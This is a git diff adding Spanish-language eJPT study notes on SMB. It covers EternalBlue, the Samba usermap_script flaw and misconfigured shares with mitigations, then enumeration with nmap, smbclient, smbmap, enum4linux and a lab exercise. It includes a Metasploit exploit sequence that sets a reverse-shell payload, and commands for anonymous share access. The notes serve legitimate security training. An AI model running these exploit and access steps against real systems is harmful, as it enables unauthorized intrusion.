@@ -42,11 +42,6 @@ Realiza diferentes tipos de escaneo (ping, TCP, UDP, SYN, etc.) para mapear el e
 	interfaces de red que el sistema tiene disponibles y su configuración actual.
 ### 2.1 Salida de `ifconfig`
 ![[Pasted image 20250907150853.png]]
-OBSERVACION:
-
-
-
-
 - **`eth0` → Interfaz Ethernet (red real o virtual)**
     - Es la tarjeta de red principal que conecta tu máquina al resto de la red.
     - Tiene asignada una **dirección IPv4** (`10.0.2.15`), una **máscara de subred** y una **dirección MAC**.
@@ -918,3 +913,331 @@ Objetivo: **enumerar al máximo la web para encontrar puntos débiles**.
 
 📚 **Recurso recomendado:**  
 👉 [Wiki Securiters - CMS](https://wiki.securiters.com/securiters-wiki/web/cms)
+
+---
+# 📌 SMB (Server Message Block)
+
+👉 En el eJPT, lo más importante es **detectar servicios SMB abiertos (139/445)**, usar herramientas como `nmap`, `smbmap`, `enum4linux` y comprobar:
+
+- **Versión del servicio** (para saber si es vulnerable a EternalBlue o similares).
+- **Si existen shares accesibles** (especialmente con login anónimo).
+## 🔹 Definición
+- Protocolo de red usado en **Windows** para compartir:
+	  - Archivos
+	  - Impresoras
+	  - Recursos de red
+- Puertos por defecto:
+	  - `139/tcp` (NetBIOS Session Service)
+	  - `445/tcp` (Microsoft-DS)
+- También conocido como **CIFS (Common Internet File System)**
+- Versión actual: **SMBv3**, pero aún existen servicios con SMBv1 (inseguro).
+
+---
+
+## ⚠️ Vulnerabilidades SMB conocidas
+
+El protocolo **SMB** ha sido históricamente un objetivo crítico en ciberseguridad porque:
+
+🔹Está muy extendido en redes corporativas.
+🔹Corre sobre puertos abiertos (`139` y `445`).
+🔹Permite compartir archivos, impresoras y recursos sensibles.
+🔹En versiones antiguas, tiene graves fallos de diseño y  configuración.
+
+---
+### 1️⃣ **EternalBlue (MS17-010)**
+
+##### 🔹**Qué significa:**  
+Vulnerabilidad crítica en **SMBv1**, descubierta en 2017 y explotada por la NSA (herramienta filtrada por Shadow Brokers).
+
+##### 🔹**CVE:** CVE-2017-0144
+
+	# Identificador de EternalBlue
+	# Vulnerabilidad crítica en SMBv1 de Microsoft
+	Windows.
+	# Permite ejecución remota de código (RCE) sin
+	autenticación.
+	# Descubierta en 2017, filtrada de la NSA por el
+	grupo Shadow Brokers.
+	# Afecta a Windows XP, Vista, 7, 8, 10 y Windows
+	Server 2003/2008.
+	# Aprovecha un fallo en la forma en que SMBv1
+	maneja ciertos paquetes.
+	# Un atacante puede enviar paquetes malformados
+	al puerto 445/TCP.
+	# Esto permite tomar control completo del sistema
+	afectado.
+	# Exploits famosos: WannaCry, NotPetya
+	(propagación como gusano).
+	# Solución: aplicar el parche de seguridad MS17
+	010 y deshabilitar SMBv1.
+
+##### 🔹**Impacto:**  
+Permite **ejecutar código remoto sin autenticación** (RCE) enviando paquetes malformados al puerto 445.
+##### 🔹**Explotación famosa:**
+
+	WannaCry (ransomware global en 2017).
+    NotPetya (malware destructivo en 2017).
+##### 🔹**Consecuencia:**  
+Un atacante puede **tomar el control total de un sistema Windows vulnerable** y propagar el ataque automáticamente en toda la red (worm).
+##### 🔹 **Mitigación:**
+
+	🔹 Deshabilitar SMBv1.
+	🔹Aplicar el parche de seguridad MS17-010.
+
+---
+
+### 2️⃣ **Usermap Script Vulnerability en Samba**
+
+##### 🔹**Qué significa:**  
+
+Vulnerabilidad en ciertas versiones de **Samba** (implementación de SMB en Linux/Unix).
+
+##### 🔹**CVE:** CVE-2007-2447
+
+	# Identificador de Usermap Script Vulnerability
+	# Vulnerabilidad crítica en Samba (implementación
+	de SMB en sistemas Unix/Linux).
+	# Afecta a versiones **anteriores a Samba
+	3.0.25rc3**.
+	# Samba permitía que los nombres de usuario se
+	asignaran mediante scripts (username map
+	script).
+	# Un atacante podía inyectar comandos maliciosos
+	en esa asignación, que se ejecutaban directamente
+	en el sistema.
+
+Ejemplo del payload en Metasploit:
+```bash
+use exploit/multi/samba/usermap_script
+set RHOST [IP]
+set PAYLOAD cmd/unix/reverse
+set LHOST [Tu_IP]
+exploit
+```
+
+##### 🔹**Impacto:**  
+
+	# Permite ejecución remota de comandos si el
+	atacante puede conectarse a un servicio Samba
+	vulnerable.
+
+	# No requiere credenciales válidas → se puede
+	explotar de forma no autenticada.
+
+	# Consecuencia: ejecución remota de código 
+	(RCE) con privilegios del proceso Samba.
+	
+##### 🔹**Cómo funciona:**
+
+    - Samba permite usar scripts de "username map"
+    para asignar nombres de usuario.
+    - Esta funcionalidad era manipulable: un atacante
+    podía inyectar comandos maliciosos que se
+    ejecutaban con privilegios elevados.
+
+##### 🔹**Ejemplo en Metasploit:**
+
+```
+use exploit/multi/samba/usermap_script set RHOST [IP] exploit
+```
+
+##### 🔹**Consecuencia:**  
+
+Compromiso completo del sistema Linux con Samba vulnerable.
+
+##### 🔹 **Mitigación:**
+
+- Actualizar Samba a una versión parcheada. **3.0.25rc3 o superior**.
+- Deshabilitar la característica de `username map script` si no es necesaria.
+- Restringir el acceso a SMB en entornos inseguros.
+
+---
+### 3️⃣ **Riesgo de shares mal configurados**
+
+##### 🔹 **Qué significa:**  
+    Los shares (recursos compartidos) pueden
+    configurarse con diferentes niveles de acceso:
+	    - Solo lectura (read-only)
+	    - Lectura y escritura (read/write)
+	    - Acceso restringido a usuarios específicos
+
+##### 🔹En muchas redes, los administradores **configuran mal estos permisos**, dejando acceso a:
+    - Usuarios anónimos (`guest`, `null session`)
+    - Cuentas con contraseñas débiles o por defecto
+
+##### 🔹**Impacto:**
+    - Lectura no autorizada: un atacante puede
+    obtener archivos sensibles, credenciales,
+    backups.
+    - Escritura no autorizada: un atacante puede 
+    subir archivos maliciosos, como shells o malware,
+    comprometiendo el sistema.
+
+##### 🔹**Ejemplo de explotación:**
+
+Enumeración con:
+	`smbclient -U "" -L //[IP]`
+	`Conexión anónima a un share:
+```
+smbclient //[IP]/share -U ""
+```
+    Descarga/subida de archivos sensibles.
+
+##### 🔹**Mitigación:**
+
+- No permitir **login anónimo**.
+- Revisar permisos en cada share.
+- Aplicar segmentación de red y monitoreo.
+
+---
+
+## 🔎 Enumeración de SMB
+
+### 1. Escaneo con Nmap
+```bash
+nmap -p139,445 --script=*smb* [IP]
+nmap -p139,445 -sV [IP]
+````
+
+- Detecta versión de SMB
+- Enumera shares, usuarios, políticas de seguridad
+
+📌 Ejemplo de resultado:
+
+```
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+OS: Windows 6.1 (Samba 4.9.5-Debian)
+Computer name: DAWN
+Domain: dawn
+FQDN: dawn.dawn
+```
+
+---
+
+### 2. Uso de `smbclient`
+
+Herramienta para interactuar con shares SMB.
+
+- Ver versión y shares:
+
+```bash
+smbclient -H [IP]
+```
+
+- Enumerar shares anónimos:
+
+```bash
+smbclient -U "" -L //[IP]
+```
+
+- Conectarse a un share:
+
+```bash
+smbclient //[IP]/share -U usuario
+```
+
+---
+
+### 3. Uso de `smbmap`
+
+Enumeración de shares y permisos de acceso.
+
+```bash
+smbmap -H [IP]
+```
+
+📌 Ejemplo de salida:
+
+```
+Disk    Permissions
+print$  NO ACCESS
+ITDEPT  READ, WRITE
+IPC$    NO ACCESS
+```
+
+---
+
+### 👉 4. Uso de `enum4linux`
+
+Herramienta clásica para enumerar usuarios y shares.
+
+```bash
+enum4linux -a [IP]
+```
+
+- `-a` → Modo completo
+- Opcional con credenciales:
+
+```bash
+enum4linux -a -u user -p 'password' [IP]
+```
+
+---
+
+### 5. Uso de Metasploit
+
+Módulos útiles para SMB:
+
+```bash
+use auxiliary/scanner/smb/smb_version
+use exploit/multi/samba/usermap_script
+```
+
+---
+
+## 📝 Ejercicio práctico
+
+### Escenario
+
+Tienes un host en `192.168.210.11` con SMB activo.
+### Paso 1: Detectar puertos abiertos
+
+```bash
+nmap -p139,445 192.168.210.11
+```
+
+### Paso 2: Detección de versión y scripts NSE
+
+```bash
+nmap -p139,445 -sV --script=smb-os-discovery,smb-enum-shares 192.168.210.11
+```
+
+Salida esperada:
+
+- Versión de Samba o Windows
+- Nombre del equipo
+- Nombre del dominio
+- Lista de shares disponibles
+
+### Paso 3: Enumerar con smbclient
+
+```bash
+smbclient -U "" -L //192.168.210.11
+```
+
+Si existen shares con acceso anónimo, conectarse:
+
+```bash
+smbclient //192.168.210.11/ITDEPT -U ""
+```
+
+### Paso 4: Enumerar con smbmap
+
+```bash
+smbmap -H 192.168.210.11
+```
+
+- Ver permisos de lectura/escritura
+
+### Paso 5: Enumeración avanzada con enum4linux
+
+```bash
+enum4linux -a 192.168.210.11
+```
+
+- Usuarios de dominio
+- Shares accesibles
+- Políticas de seguridad
+
+---
